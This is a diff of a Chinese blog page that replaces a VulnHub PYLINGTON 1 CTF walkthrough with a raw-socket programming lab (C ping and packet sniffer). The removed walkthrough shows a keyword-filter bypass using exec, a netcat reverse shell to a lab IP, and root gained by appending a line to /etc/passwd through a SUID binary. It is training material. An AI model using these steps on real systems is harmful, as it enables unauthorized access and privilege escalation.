@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>vulnhub 靶场 PYLINGTON 1 | xzenge</title>
-  <meta name="keywords" content=" 靶机实战 ">
-  <meta name="description" content="vulnhub 靶场 PYLINGTON 1 | xzenge">
+  <title>实验六 基于原始套接字的编程 | xzenge</title>
+  <meta name="keywords" content=" 网络编程 ">
+  <meta name="description" content="实验六 基于原始套接字的编程 | xzenge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ping 捕捉数据报    ping&#x2F;&#x2F; ping.cpp : Defines the entry point for the console application. &#x2F;&#x2F;  #include &quot;stdafx.h&quot;  #include &lt;winsock2.h&gt; #include &quot;ping.h&quot; #pragma comment (li">
 <meta property="og:type" content="article">
@@ -467,39 +467,31 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-vulnhub-靶场-PYLINGTON-1" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-实验六-基于原始套接字的编程" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">vulnhub 靶场 PYLINGTON 1</h1>
+        <h1 class="article-title">实验六 基于原始套接字的编程</h1>
     
     <div class="article-meta">
         
         
-        
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="渗透测试">渗透测试</a>
-            
-        </span>
         
         
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">靶机实战</a>
+            <a class="color5">网络编程</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-10-16 21:25:46'>2022-10-14 15:40</time>
+            发布时间 : <time class="date" title='最后更新: 2022-10-19 23:36:42'>2022-10-19 23:35</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:708</span>
+        <span>字数:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -518,7 +510,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">一，信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">二，漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">三，提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">四，GetFlag</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">捕捉数据报</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -539,114 +531,241 @@
 <!-- toc -->
 
 <ul>
-<li><a href="#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">一，信息收集</a></li>
-<li><a href="#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二，漏洞利用</a></li>
-<li><a href="#%E4%B8%89%E6%8F%90%E6%9D%83">三，提权</a></li>
-<li><a href="#%E5%9B%9Bgetflag">四，GetFlag</a></li>
+<li><a href="#ping">ping</a></li>
+<li><a href="#%E6%8D%95%E6%8D%89%E6%95%B0%E6%8D%AE%E6%8A%A5">捕捉数据报</a></li>
 </ul>
 <!-- tocstop -->
 
-<p>#vulnhub 靶场 PYLINGTON: 1</p>
-<h2><span id="一信息收集">一，信息收集</span></h2><p><strong>1.使用nmap对目标靶机进行扫描</strong></p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014130814948.png" alt="image-20221014130814948" style="zoom: 67%;">
+<h2><span id="ping">ping</span></h2><pre><code class="c">// ping.cpp : Defines the entry point for the console application.
+//
 
-<p>发现开放了22和80端口。</p>
-<p><strong>2.80端口</strong></p>
-<p>查看源码也没发现什么，扫一下目录：</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014133559374.png" alt="image-20221014133559374" style="zoom:67%;">
+#include &quot;stdafx.h&quot;
 
-<p>发现有 robots.txt 文件，查看一下：</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014141655256.png" alt="image-20221014141655256" style="zoom:67%;">
+#include &lt;winsock2.h&gt;
+#include &quot;ping.h&quot;
+#pragma comment (lib,&quot;ws2_32.lib&quot;)
 
-<p>&#x2F;zbir7mn240soxhicso2z 有点可疑，访问一下：</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014141757452.png" alt="image-20221014141757452" style="zoom:67%;">
+u_short in_cksum(u_short *addr, int len)
+&#123;
+    register int nleft = len;
+    register u_short *w = addr;
+    register u_short answer;
+    register int sum = 0;
+    while( nleft &gt; 1 )  &#123;
+        sum += *w++;
+        nleft -= 2;
+    &#125;
 
-<p>发现了一组用户名和密码。</p>
-<pre><code>Username: steve
+    if( nleft == 1 ) &#123;
+        u_short	u = 0;
 
-Password: bvbkukHAeVxtjjVH
+        *(u_char *)(&amp;u) = *(u_char *)w ;
+        sum += u;
+    &#125;
+
+    
+    sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);	/* add hi 16 to low 16 */
+    sum += (sum &gt;&gt; 16);			/* add carry */
+    answer = ~sum;				/* truncate to 16 bits */
+    return (answer);
+&#125;
+int main(int argc, char* argv[])
+&#123;
+    WSADATA data;
+    int r=WSAStartup(MAKEWORD(2,2),&amp;data);
+    char name[100]=&#123;0&#125;;
+    gethostname(name,100);   
+    printf(&quot;本机名%s\n&quot;,name);
+    SOCKET s=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
+    if(s==-1)
+    &#123;
+        printf(&quot;创建套接字失败!&quot;);
+        WSACleanup();
+        return 0;
+    &#125;
+    LPHOSTENT lpHost;
+    struct    sockaddr_in saDest;
+    struct    sockaddr_in saSrc;
+    DWORD	  dwTimeSent;
+    DWORD	  dwElapsed;
+    HOSTENT* local=gethostbyname(argv[1]);
+    saDest.sin_family=AF_INET;
+    saDest.sin_port=0;
+    saDest.sin_addr.S_un.S_addr=*(unsigned long *)local-&gt;h_addr_list[0];
+
+    saSrc.sin_addr.S_un.S_addr=inet_addr(&quot;172.19.1.42&quot;);
+    saSrc.sin_family=AF_INET;
+    saSrc.sin_port=0;
+
+    r=bind(s,(const sockaddr *)&amp;saSrc,sizeof(saSrc));
+
+    ECHOREQUEST req;
+    ECHOREPLY rep;
+    for(int i=0;i&lt;REQ_DATASIZE;i++)
+    req.cData[i]=i;
+
+    req.icmpHdr.Type=8;
+    req.icmpHdr.Code=0;
+    req.icmpHdr.ID=GetCurrentProcessId();
+    printf(&quot;正在 Ping %s [%s] 具有 32 字节的数据:\n&quot;,argv[1],inet_ntoa(saDest.sin_addr));
+    for(i=0;i&lt;4;i++)
+    &#123;
+        req.icmpHdr.Seq=i+1;
+        req.icmpHdr.Checksum=0;
+        req.dwTime=GetTickCount();
+        
+        req.icmpHdr.Checksum=in_cksum((u_short *)&amp;req,sizeof(req));
+        r=sendto(s,(const char *)&amp;req,sizeof(req),0,(const sockaddr *)&amp;saDest,sizeof(saDest));
+        
+        
+        memset((void *)&amp;rep,0,sizeof(rep));
+        struct sockaddr_in from;
+        int fromlen=sizeof(from);
+        r=recvfrom(s,(char *)&amp;rep,sizeof(rep),0,(sockaddr *)&amp;from,&amp;fromlen);
+        
+        if(r&gt;0)
+        &#123;
+            char *srcip=inet_ntoa(*(in_addr *)&amp;rep.ipHdr.iaSrc.S_un.S_addr);
+            int size=r-sizeof(IPHDR)-sizeof(ICMPHDR)-sizeof(long);
+            long time=GetTickCount()-rep.echoRequest.dwTime;
+            int ttl=rep.ipHdr.TTL;
+            printf(&quot;来自 %s的应答：srcip=%s,字节=%d,时间=%d,TTL=%d\n&quot;,inet_ntoa(from.sin_addr),srcip,size,time,ttl);
+            
+        &#125;
+    &#125;
+    closesocket(s);
+    WSACleanup();
+    return 0;
+&#125;
 </code></pre>
-<h2><span id="二漏洞利用">二，漏洞利用</span></h2><p>进入&#x2F;login页面尝试登入，登入后进入了一个Python IDE的界面</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014141931233.png" alt="image-20221014141931233"></p>
-<p>可以在程序框输入代码，然后执行</p>
-<p>提示给了下面程序页面的一个源码</p>
-<pre><code class="py">def check_if_safe(code: str) -&gt; bool:
-    if &#39;import&#39; in code: # import is too dangerous
-        return False
-    elif &#39;os&#39; in code: # os is too dangerous
-        return False
-    elif &#39;open&#39; in code: # opening files is also too dangerous
-        return False
-    else:
-        return True
+<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/50RZTV()4U%}8K%L9XMIZ_L.png" alt="img" style="zoom:50%;">
+
+
+
+<h2><span id="捕捉数据报">捕捉数据报</span></h2><pre><code class="c">// 捕获数据报.cpp : Defines the entry point for the console application.
+//
+
+#include &quot;stdafx.h&quot;
+#include &quot;winsock2.h&quot;
+//#include &quot;mstcpip.h&quot;
+
+#include&lt;stdlib.h&gt;
+
+#pragma comment(lib,&quot;ws2_32.lib&quot;)
+#define SIO_RCVALL  0x98000001
+#define DEFAULT_BUFLEN 65535
+#define DEFAULT_NAMELEN 512
+int main(int argc, char* argv[])
+&#123;
+
+    WSADATA wsaData;
+    SOCKET SnifferSocket = INVALID_SOCKET;
+    char recvbuf[DEFAULT_BUFLEN];
+    int iResult;
+    int recvbuflen = DEFAULT_BUFLEN;
+    HOSTENT* local;
+    char HostName[DEFAULT_NAMELEN];
+    IN_ADDR addr;
+    SOCKADDR_IN LocalAddr, RemoteAddr;
+    int addrlen = sizeof(SOCKADDR_IN);
+    int in = 0, i = 0;
+    DWORD dwBufferLen;
+    DWORD Optval = 1;
+    DWORD dwBytesReturned = 0;
+
+    //初始化套接字
+    iResult = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+    if (iResult != 0)
+    &#123;
+        printf( &quot;初始化失败\n&quot;);
+        return 1;
+    &#125;
+    //创建套接字
+    SnifferSocket = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+    if (INVALID_SOCKET == SnifferSocket)
+    &#123;
+        printf(&quot;创建套接字失败：失败码%d\n&quot;,WSAGetLastError());;
+        WSACleanup();
+        return 1;
+    &#125;
+    //获取本机名称
+    memset(HostName, 0, DEFAULT_NAMELEN);
+    iResult = gethostname(HostName, sizeof(HostName));
+    if (SOCKET_ERROR == iResult)
+    &#123;
+        printf(&quot;获取本机名称失败：失败码%d\n&quot;,WSAGetLastError());;
+        WSACleanup();
+        return 1;
+    &#125;
+    //获取本机IP
+    local = gethostbyname(HostName);
+    printf(&quot;本机可用的IP地址有：\n&quot;); 
+    if (NULL == local)
+    &#123;
+        printf(&quot;获取IP失败：失败码%d\n&quot;,WSAGetLastError());
+        WSACleanup();
+        return 1;
+    &#125;
+    while (local-&gt;h_addr_list[i] != 0)
+    &#123;
+        addr.s_addr = *(u_long*)local-&gt;h_addr_list[i++];
+        printf(&quot;\t %d: \t%s\n&quot;, i, inet_ntoa(addr));
+    &#125;
+    printf(&quot;请选择捕获数据包待使用的接口号：\n&quot;);
+    scanf(&quot;%d&quot;,&amp;in);
+    memset(&amp;LocalAddr, 0, sizeof(LocalAddr));
+    memcpy(&amp;LocalAddr.sin_addr.S_un.S_addr, local-&gt;h_addr_list[in - 1], sizeof(LocalAddr.sin_addr.S_un.S_addr));
+    LocalAddr.sin_family = AF_INET;
+    LocalAddr.sin_port = 0;
+    //绑定
+    iResult = bind(SnifferSocket, (SOCKADDR*)&amp;LocalAddr, sizeof(LocalAddr));
+    if (SOCKET_ERROR == iResult)
+    &#123;
+        printf( &quot;绑定失败：失败码%d\n&quot;,WSAGetLastError());
+        closesocket(SnifferSocket);
+        WSACleanup();
+        return 1;
+    &#125;
+    printf(&quot;成功绑定套接字和%d号接口地址\n&quot;,in);
+    //设置套接字接受命令
+//	iResult = WSAIoctl(SnifferSocket, SIO_RCVALL, &amp;Optval, sizeof(Optval), &amp;dwBufferLen, sizeof(dwBufferLen), &amp;dwBytesReturned, NULL, NULL);
+    iResult = ioctlsocket(SnifferSocket, SIO_RCVALL, &amp;Optval);//, sizeof(Optval), &amp;dwBufferLen, sizeof(dwBufferLen), &amp;dwBytesReturned, NULL, NULL);
+    if (SOCKET_ERROR == iResult)
+    &#123;
+        printf( &quot;套接字设置失败：失败码%d\n&quot;,WSAGetLastError());
+        closesocket(SnifferSocket);
+        WSACleanup();
+        return 1;
+    &#125;
+    //开始接受数据
+    printf( &quot;开始接受数据\n&quot;);
+    for(i=0;i&lt;10;i++)
+    &#123;
+        //接受数据
+        iResult = recvfrom(SnifferSocket, recvbuf, DEFAULT_BUFLEN, 0, (SOCKADDR*)&amp;RemoteAddr, &amp;addrlen);
+        if (iResult &gt; 0)
+        &#123;
+            //for(int n=1;n&lt;iResult;n++)
+            //	printf(&quot;%d &quot;,recvbuf[9]);
+            char xieyi[10]=&#123;0&#125;;
+            if(recvbuf[9]==1) strcpy(xieyi, &quot;ICMP&quot;);
+            if(recvbuf[9]==2) strcpy(xieyi, &quot;IGMP&quot;);
+            if(recvbuf[9]==6) strcpy(xieyi, &quot;TCP&quot;);
+            if(recvbuf[9]==17) strcpy(xieyi, &quot;UDP&quot;);
+            if(recvbuf[9]==88) strcpy(xieyi, &quot;IGRP&quot;);
+            if(recvbuf[9]==89)  strcpy(xieyi, &quot;OSPF&quot;);
+            printf(&quot;%s\n&quot;,recvbuf);
+            printf( &quot;接受来自 %s的数据包,长度为%d,协议类型为：%s\n&quot;,inet_ntoa(RemoteAddr.sin_addr), iResult,xieyi);
+        &#125;
+        else
+            printf( &quot;接受失败：失败码%d\n&quot;,WSAGetLastError());
+    &#125; 
+    
+    system(&quot;pause&quot;);
+    return 0;
+&#125;
 </code></pre>
-<p>就是不能直接执行程序不能包含<code>import</code>，<code>os</code>和<code>open</code></p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014142307407.png" alt="image-20221014142307407" style="zoom: 50%;">
-
-<p>尝试字符串拼接执行</p>
-<pre><code>str1=&#39;impor&#39;+&#39;t&#39;+&#39; o&#39;+&#39;s&#39;
-exec(str1)
-</code></pre>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014142320530.png" alt="image-20221014142320530" style="zoom:50%;">
-
-<p>程序没有产生报错信息，也就是可以进行字符拼接，然后利用exec()函数执行相关命令</p>
-<p>写入反弹 shell，nc 监听</p>
-<pre><code class="py">str1=&#39;impor&#39;+&#39;t&#39;+&#39; o&#39;+&#39;s&#39;
-str2=&#39;o&#39;+&#39;s.system(&quot;nc 192.168.79.132 1234 -e /bin/bash&quot;)&#39;
-exec(str1)
-exec(str2)
-</code></pre>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014142808605.png" alt="image-20221014142808605" style="zoom: 67%;">
-
-<p>连接成功，升级下shell</p>
-<p>1.在靶机上输入以下命令（使用机器上可用的 python 版本！）</p>
-<pre><code class="sh">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;
-</code></pre>
-<p>2.接下来，在靶机上输入以下命令来设置一些重要的环境变量：</p>
-<pre><code class="sh">export SHELL=bash
-export TERM=xterm-256color #允许 clear，并且有颜色
-</code></pre>
-<p>3.键入 ctrl-z 以将 shell 发送到后台。</p>
-<p>4.设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。</p>
-<pre><code class="sh">stty raw -echo;fg
-</code></pre>
-<p>回车一次后输入 rese 再回车将再次进入 shell 中：</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014145537128.png" alt="image-20221014145537128"></p>
-<h2><span id="三提权">三，提权</span></h2><p>查看文件，在&#x2F;home目录下有关用户py:</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014143654886.png" alt="image-20221014143654886"></p>
-<p>发现了一个suid二进制文件，执行下看看：</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014143841156.png" alt="image-20221014143841156" style="zoom:67%;">
-
-<p>得到一串字符，再查看下<code>typing.cc</code>文件</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014143918634.png" alt="image-20221014143918634" style="zoom:67%;">
-
-<p>发现得到的是py用户的密钥，切换到py用户：</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014144042931.png" alt="image-20221014144042931" style="zoom: 80%;">
-
-<p>进入到secret_stuff文件夹</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014144224823.png" alt="image-20221014144224823" style="zoom:80%;">
-
-<p>在这里也发现了一个suid文件，先查看下源文件backup.cc。</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014144319052.png" alt="image-20221014144319052" style="zoom:80%;">
-
-<p>发现是可以写入一段文字到<code>/srv/backups</code>目录下</p>
-<p>随便写个文件看看行不</p>
-<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014144800761.png" alt="image-20221014144800761" style="zoom:80%;">
-
-<p>尝试下是否存在目录穿越的情况：</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014145753959.png" alt="image-20221014145753959"></p>
-<p>由于具有suid权限，可直接在 &#x2F;etc&#x2F;passwd 文件中添加root密码</p>
-<p>首先使用 Openssl 工具生成密码：</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014150213122.png" alt="image-20221014150213122"></p>
-<p>构造下格式跟&#x2F;etc&#x2F;passwd中的格式一样</p>
-<p><code>xzenge:$1$xzenge$oU7aLABTCYykL1omP2vwe/:0:0::/root:/bin/bash</code></p>
-<p>写入到&#x2F;etc&#x2F;passwd文件中</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014150450397.png" alt="image-20221014150450397"></p>
-<p>成功获得root权限</p>
-<h2><span id="四getflag">四，GetFlag</span></h2><p>去到root目录下查看文件</p>
-<p><img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221014150610242.png" alt="image-20221014150610242"></p>
-<p>获得flag</p>
-<p>完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</p>
+<img src="https://gitee.com/zeng-haiyong/md-picture-library/raw/master/image-20221019192922447.png" alt="image-20221019192922447" style="zoom:50%;">
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1936971269@qq.com </span>
